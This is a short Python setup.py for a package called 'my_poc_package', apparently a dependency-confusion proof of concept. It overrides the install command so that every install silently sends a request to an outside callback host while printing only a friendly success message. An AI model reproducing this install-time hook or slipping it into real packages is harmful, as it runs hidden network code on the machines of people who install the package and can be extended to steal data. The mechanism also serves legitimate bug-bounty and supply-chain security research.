from setuptools import setup, find_packages
from setuptools.command.install import install
import requests


# Custom command that runs after install
class PostInstallCommand(install):
    def run(self):
        # Run the normal install process first
        install.run(self)
        # Now run the post-installation function
        self.run_post_install()

    def run_post_install(self):
        print("Package 'my_poc_package' has been successfully installed!")
        # You can add your custom logic here, such as calling a function from your package
        requests.get("https://0abhjbkjgw63avm5jtogkd3tjkpode13.i.ywh.at")

setup(
    name='my_poc_package',
    version='0.1',
    packages=find_packages(),
    install_requires=[],  # Dependencies can be added here
    cmdclass={
        'install': PostInstallCommand,
    },
)
